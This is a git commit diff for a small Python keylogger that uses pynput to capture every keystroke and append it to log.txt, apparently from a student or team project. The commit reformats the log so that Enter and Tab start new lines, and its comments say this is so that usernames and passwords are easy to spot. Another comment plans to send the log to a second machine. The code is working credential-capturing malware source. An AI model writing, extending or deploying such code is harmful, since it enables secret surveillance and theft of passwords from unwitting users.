4119dfc60c92e8a0a89136231befdea23b82e5fe
Lachezar <31971186+Todorov-Lachezar@users.noreply.github.com>
2021-09-21 15:24:39 -0400

    Added some format changes and comments
    Added in changes to how the format of the output file it. Enter and tab are converted to newlines and shifts are ignored. Added comments to help with readability and understandability of the code

--- Keylogger/keylogger.py
+++ Keylogger/keylogger.py
@@ -2,36 +2,58 @@ import pynput
 
 from pynput.keyboard import Key, Listener
 
-count = 0
-keys = []
+# initialization variables
+count = 0 # standard counter
+keys = [] # a list that will store the key inputs
 
+## Make it so that the keylogger can be ran on one 
+## machine and output the log file to another machine
+
+# a function that is executed when a key is pressed 
 def on_press(key):
     global keys, count
 
+    # add pressed key to the list and print out which 
+    # key was pressed
     keys.append(key)
     count += 1
     print(" {0} pressed ".format(key))
 
-    if count >= 10:
+    # when the count is greater than or equal to 5
+    # reset the count, write to the text file, and
+    # reset the keys list
+    if count >= 5:
         count = 0
         write_file(keys)
         keys = []
 
+# fucntion that writes the key list to the output file
 def write_file(keys):
-    with open("log.txt", "a") as f: #w = write, a = add?
+    with open("log.txt", "a") as f: # w = write, a = add?
         for key in keys:
+            #remove the ' around every input
             k = str(key).replace("'", "").replace("Key.", "")
-            #if k.find("space") > 0:
-            #    f.write("\n")
-            #elif f.find("Key") == -1:
-            f.write(k + "\n")
+            
+            # Using the Enter or Tab key could mean that 
+            # someone is typing a username and/or password. 
+            # This will help a team member easily identify them
+            if key == Key.enter or key == Key.tab:
+                f.write("\n")
+            # Keylogger recognizes uppercase characters so having
+            # the shift in the output file is unecessary
+            elif key == Key.shift:
+                continue
+            else:
+                f.write(k + " ")
 
 
+# Should exit the program when an Esc key is pressed
 def on_release(key):
     if key == Key.esc:
         return False
 
-
+# Listens in on the keyboard inputs and executes the functions 
+# on_press and on_release when a key is pressed
 with Listener(on_press=on_press, in_release=on_release) as listener:
     listener.join()
 
